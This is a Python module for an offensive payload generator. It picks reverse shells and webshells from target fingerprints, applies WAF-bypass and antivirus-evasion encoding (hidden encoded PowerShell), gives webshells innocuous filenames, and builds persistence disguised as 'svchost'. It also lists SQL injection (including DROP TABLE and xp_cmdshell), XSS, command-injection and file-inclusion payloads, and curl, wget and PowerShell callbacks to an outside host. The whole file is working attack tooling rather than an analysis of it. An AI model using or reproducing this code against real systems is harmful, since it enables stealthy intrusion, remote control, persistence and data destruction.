"""
Adaptive payload generator.
Generates context-aware payloads based on target fingerprinting.
"""
import base64
import random
import re
from typing import Dict, List, Optional, Tuple
from .templates import (
    REVERSE_SHELLS, 
    WEBSHELLS, 
    WAF_BYPASS, 
    AV_EVASION,
    PERSISTENCE_TEMPLATES
)


class AdaptivePayloadGenerator:
    """
    Generates payloads adapted to target environment.
    
    Takes fingerprint data (OS, tech stack, defenses) and produces
    appropriate payloads with evasion techniques applied.
    """
    
    def __init__(self):
        self.templates = REVERSE_SHELLS
        self.webshells = WEBSHELLS
        self.waf_bypass = WAF_BYPASS
        self.av_evasion = AV_EVASION
        self.persistence = PERSISTENCE_TEMPLATES
    
    def generate_reverse_shell(
        self,
        host: str,
        port: int,
        fingerprint: Dict,
        waf_detected: bool = False,
        av_detected: bool = False,
        preferred_type: Optional[str] = None
    ) -> Dict:
        """
        Generate reverse shell based on target fingerprint.
        
        Args:
            host: Callback host/IP
            port: Callback port
            fingerprint: Target fingerprint dict with os, languages, etc.
            waf_detected: Whether WAF was detected
            av_detected: Whether AV/EDR was detected
            preferred_type: Force specific shell type if available
            
        Returns:
            Dict with payload, type, variant, encoding status
        """
        
        os_type = fingerprint.get("os", "linux").lower()
        available_langs = fingerprint.get("languages", [])
        
        # Select best shell type based on environment
        if preferred_type and preferred_type in self.templates:
            shell_type = preferred_type
        elif os_type == "windows":
            shell_type = "powershell"
        elif "python3" in available_langs or "python" in available_langs:
            shell_type = "python"
        elif "php" in available_langs:
            shell_type = "php"
        elif "perl" in available_langs:
            shell_type = "perl"
        elif "ruby" in available_langs:
            shell_type = "ruby"
        else:
            shell_type = "bash"
        
        # Select variant based on detection status
        if av_detected:
            if shell_type == "powershell":
                variant = "encoded"
            elif shell_type == "bash":
                variant = "encoded"
            else:
                variant = "basic"
        elif waf_detected:
            variant = "encoded" if "encoded" in self.templates.get(shell_type, {}) else "basic"
        else:
            variant = "basic"
        
        # Handle python/python3 selection
        actual_shell = shell_type
        if shell_type == "python":
            if "python3" in available_langs:
                actual_shell = "python"
                variant = "python3"
            else:
                actual_shell = "python"
                variant = "basic"
        
        # Get template
        template = self.templates.get(actual_shell, {}).get(variant, "")
        
        if not template:
            # Fallback to basic variant
            template = self.templates.get(actual_shell, {}).get("basic", "")
        
        # Fill in variables
        payload = template.format(host=host, port=port)
        
        # Apply evasion if needed
        if av_detected and os_type == "windows":
            payload = self._apply_av_evasion(payload, "powershell")
        
        if waf_detected:
            payload = self._apply_waf_bypass(payload, "rce")
        
        return {
            "payload": payload,
            "type": actual_shell,
            "variant": variant,
            "encoded": "encoded" in variant or av_detected,
            "evasion_applied": av_detected or waf_detected,
            "host": host,
            "port": port,
            "alternatives": self._get_alternatives(actual_shell, host, port)
        }
    
    def _get_alternatives(self, primary_type: str, host: str, port: int) -> List[Dict]:
        """Get alternative shell options."""
        alternatives = []
        for shell_type, variants in self.templates.items():
            if shell_type != primary_type and "basic" in variants:
                alt_payload = variants["basic"].format(host=host, port=port)
                alternatives.append({
                    "type": shell_type,
                    "payload": alt_payload
                })
                if len(alternatives) >= 3:
                    break
        return alternatives
    
    def generate_webshell(
        self,
        fingerprint: Dict,
        stealth_level: int = 1,
        preferred_type: Optional[str] = None
    ) -> Dict:
        """
        Generate webshell based on server technology.
        
        Args:
            fingerprint: Target fingerprint
            stealth_level: 1=simple, 2=hidden, 3=obfuscated
            preferred_type: Force specific shell type
            
        Returns:
            Dict with payload, type, variant, filename
        """
        
        tech = fingerprint.get("technology", "").lower()
        
        # Determine shell type from technology
        if preferred_type and preferred_type in self.webshells:
            shell_type = preferred_type
        elif any(x in tech for x in ["asp", "iis", ".net", "aspx"]):
            shell_type = "aspx"
        elif any(x in tech for x in ["jsp", "java", "tomcat", "jboss", "weblogic"]):
            shell_type = "jsp"
        elif any(x in tech for x in ["cfm", "coldfusion"]):
            shell_type = "cfm"
        else:
            shell_type = "php"  # Default fallback
        
        variants = list(self.webshells.get(shell_type, {}).keys())
        
        # Select variant based on stealth level
        if stealth_level >= 3 and "obfuscated" in variants:
            variant = "obfuscated"
        elif stealth_level >= 2 and "hidden" in variants:
            variant = "hidden"
        elif stealth_level >= 2 and "base64" in variants:
            variant = "base64"
        else:
            variant = "simple"
        
        payload = self.webshells.get(shell_type, {}).get(variant, "")
        
        # Generate random filename
        filename = self._generate_webshell_filename(shell_type)
        
        return {
            "payload": payload,
            "type": shell_type,
            "variant": variant,
            "filename": filename,
            "stealth_level": stealth_level,
            "param": self._get_webshell_param(payload)
        }
    
    def _generate_webshell_filename(self, shell_type: str) -> str:
        """Generate innocuous webshell filename."""
        names = ["config", "settings", "functions", "utils", "helper", "common", "init"]
        return f"{random.choice(names)}.{shell_type}"
    
    def _get_webshell_param(self, payload: str) -> str:
        """Extract command parameter name from webshell."""
        # Look for GET/POST parameter
        match = re.search(r"\$_(GET|POST)\['([^']+)'\]", payload)
        if match:
            return match.group(2)
        match = re.search(r'request\.getParameter\("([^"]+)"\)', payload)
        if match:
            return match.group(1)
        match = re.search(r'Request\["([^"]+)"\]', payload)
        if match:
            return match.group(1)
        return "cmd"
    
    def generate_injection_payload(
        self,
        injection_type: str,
        context: str = "default",
        waf_detected: bool = False,
        target_db: Optional[str] = None
    ) -> List[Dict]:
        """
        Generate injection payloads for specific context.
        
        Args:
            injection_type: sqli, xss, rce, lfi, etc.
            context: Injection context (url, form, header, etc.)
            waf_detected: Whether WAF was detected
            target_db: Database type for SQLi (mysql, mssql, oracle, etc.)
            
        Returns:
            List of payload dicts with payload and description
        """
        
        payloads = []
        
        if injection_type == "sqli":
            base_payloads = self._get_sqli_payloads(target_db)
            
            if waf_detected:
                for p in base_payloads:
                    bypassed = self._apply_waf_bypass(p["payload"], "sqli")
                    payloads.append({
                        "payload": bypassed,
                        "description": p["description"] + " (WAF bypass)",
                        "original": p["payload"]
                    })
            else:
                payloads = base_payloads
                
        elif injection_type == "xss":
            base_payloads = [
                {"payload": "<script>alert(1)</script>", "description": "Basic reflected XSS"},
                {"payload": "<img src=x onerror=alert(1)>", "description": "IMG tag XSS"},
                {"payload": "<svg onload=alert(1)>", "description": "SVG XSS"},
                {"payload": "javascript:alert(1)", "description": "JavaScript URI"},
                {"payload": "'-alert(1)-'", "description": "Attribute escape XSS"},
                {"payload": "</script><script>alert(1)</script>", "description": "Script break XSS"},
            ]
            
            if waf_detected:
                for p in base_payloads:
                    bypassed = self._apply_waf_bypass(p["payload"], "xss")
                    payloads.append({
                        "payload": bypassed,
                        "description": p["description"] + " (WAF bypass)",
                        "original": p["payload"]
                    })
            else:
                payloads = base_payloads
                
        elif injection_type == "rce":
            base_payloads = [
                {"payload": ";id", "description": "Command injection with semicolon"},
                {"payload": "|id", "description": "Pipe command injection"},
                {"payload": "$(id)", "description": "Command substitution"},
                {"payload": "`id`", "description": "Backtick command injection"},
                {"payload": "\nid", "description": "Newline command injection"},
                {"payload": "& id", "description": "Background command injection"},
            ]
            
            if waf_detected:
                for p in base_payloads:
                    bypassed = self._apply_waf_bypass(p["payload"], "rce")
                    payloads.append({
                        "payload": bypassed,
                        "description": p["description"] + " (WAF bypass)",
                        "original": p["payload"]
                    })
            else:
                payloads = base_payloads
                
        elif injection_type == "lfi":
            base_payloads = [
                {"payload": "../../../etc/passwd", "description": "Basic LFI"},
                {"payload": "....//....//....//etc/passwd", "description": "Filter bypass LFI"},
                {"payload": "/etc/passwd%00", "description": "Null byte termination"},
                {"payload": "php://filter/convert.base64-encode/resource=index.php", "description": "PHP filter wrapper"},
                {"payload": "php://input", "description": "PHP input wrapper (POST data)"},
                {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "description": "Data URI wrapper"},
            ]
            
            if waf_detected:
                for p in base_payloads:
                    bypassed = self._apply_waf_bypass(p["payload"], "lfi")
                    payloads.append({
                        "payload": bypassed,
                        "description": p["description"] + " (WAF bypass)",
                        "original": p["payload"]
                    })
            else:
                payloads = base_payloads
        
        return payloads
    
    def _get_sqli_payloads(self, target_db: Optional[str] = None) -> List[Dict]:
        """Get SQLi payloads, optionally tailored to specific database."""
        
        generic = [
            {"payload": "' OR '1'='1", "description": "Basic auth bypass"},
            {"payload": "' OR 1=1--", "description": "Comment termination"},
            {"payload": "' UNION SELECT NULL--", "description": "UNION column test"},
            {"payload": "' AND 1=2 UNION SELECT 1,2,3--", "description": "UNION data extract"},
            {"payload": "'; DROP TABLE users--", "description": "Destructive SQLi"},
            {"payload": "' AND SLEEP(5)--", "description": "Time-based blind SQLi"},
        ]
        
        if target_db == "mysql":
            generic.extend([
                {"payload": "' UNION SELECT @@version--", "description": "MySQL version"},
                {"payload": "' UNION SELECT table_name FROM information_schema.tables--", "description": "MySQL table enum"},
            ])
        elif target_db == "mssql":
            generic.extend([
                {"payload": "'; EXEC xp_cmdshell('whoami')--", "description": "MSSQL command exec"},
                {"payload": "' UNION SELECT @@version--", "description": "MSSQL version"},
            ])
        elif target_db == "oracle":
            generic.extend([
                {"payload": "' UNION SELECT banner FROM v$version--", "description": "Oracle version"},
                {"payload": "' UNION SELECT table_name FROM all_tables--", "description": "Oracle table enum"},
            ])
        
        return generic
    
    def _apply_waf_bypass(self, payload: str, payload_type: str) -> str:
        """Apply WAF bypass techniques to payload."""
        bypasses = self.waf_bypass.get(payload_type, {})
        
        if payload_type == "sqli":
            # Apply comment bypass for spaces
            if "comment_bypass" in bypasses:
                comment = random.choice(bypasses["comment_bypass"])
                payload = payload.replace(" ", comment)
            # Apply case variation
            if "case_variation" in bypasses:
                for orig in ["SELECT", "UNION", "FROM", "WHERE"]:
                    if orig in payload.upper():
                        variation = random.choice([
                            orig.lower(),
                            orig.capitalize(),
                            ''.join(random.choice([c.upper(), c.lower()]) for c in orig)
                        ])
                        payload = re.sub(orig, variation, payload, flags=re.IGNORECASE)
                        
        elif payload_type == "xss":
            # Apply tag variations
            if "<script>" in payload.lower():
                payload = payload.replace("<script>", "<ScRiPt>")
                payload = payload.replace("</script>", "</ScRiPt>")
            # Apply event handler variations
            payload = re.sub(r'onerror', 'OnErRoR', payload, flags=re.IGNORECASE)
            payload = re.sub(r'onload', 'OnLoAd', payload, flags=re.IGNORECASE)
            
        elif payload_type == "rce":
            # Apply space bypass
            if "space_bypass" in bypasses:
                space_bypass = random.choice(bypasses["space_bypass"])
                payload = payload.replace(" ", space_bypass)
            # Apply command separator variations
            payload = payload.replace(";", "%0a")
            
        elif payload_type == "lfi":
            if "traversal_variants" in bypasses:
                variant = random.choice(bypasses["traversal_variants"])
                payload = payload.replace("../", variant)
        
        return payload
    
    def _apply_av_evasion(self, payload: str, platform: str) -> str:
        """Apply AV evasion techniques to payload."""
        evasion = self.av_evasion.get(platform, {})
        
        if platform == "powershell":
            # Base64 encode for PowerShell
            encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
            return f"powershell -nop -w hidden -enc {encoded}"
        
        return payload
    
    def generate_callback(
        self,
        host: str,
        port: int,
        callback_type: str = "http"
    ) -> Dict:
        """
        Generate callback payload for OOB verification.
        
        Args:
            host: Callback host
            port: Callback port
            callback_type: http, dns, or icmp
            
        Returns:
            Dict with type, payload, verification instructions
        """
        
        token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        
        callbacks = {
            "http": {
                "payload": f"curl http://{host}:{port}/{token}",
                "alt_payload": f"wget -q -O- http://{host}:{port}/{token}",
                "powershell": f"(New-Object Net.WebClient).DownloadString('http://{host}:{port}/{token}')",
            },
            "dns": {
                "payload": f"nslookup {token}.{host}",
                "alt_payload": f"host {token}.{host}",
                "dig": f"dig {token}.{host}",
            },
            "icmp": {
                "payload": f"ping -c 1 {host}",
                "windows": f"ping -n 1 {host}",
            },
        }
        
        return {
            "type": callback_type,
            "token": token,
            "payloads": callbacks.get(callback_type, callbacks["http"]),
            "verification": f"Check {callback_type} listener on {host}:{port if callback_type == 'http' else '(DNS/ICMP)'} for token: {token}"
        }
    
    def generate_persistence(
        self,
        fingerprint: Dict,
        payload: str,
        name: str = "svchost"
    ) -> List[Dict]:
        """
        Generate persistence mechanisms for target OS.
        
        Args:
            fingerprint: Target fingerprint
            payload: Payload to persist
            name: Service/task name
            
        Returns:
            List of persistence options
        """
        
        os_type = fingerprint.get("os", "linux").lower()
        methods = []
        
        templates = self.persistence.get(os_type, self.persistence.get("linux", {}))
        
        for method_name, template in templates.items():
            try:
                method_payload = template.format(name=name, payload=payload)
                methods.append({
                    "method": method_name,
                    "payload": method_payload,
                    "os": os_type
                })
            except KeyError:
                # Template requires additional params
                methods.append({
                    "method": method_name,
                    "payload": template,
                    "os": os_type,
                    "requires_formatting": True
                })
        
        return methods
